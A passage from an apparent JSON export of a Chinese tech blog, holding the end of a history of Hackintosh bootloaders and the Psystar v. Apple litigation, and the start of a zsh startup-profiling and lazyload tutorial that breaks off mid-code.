开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion 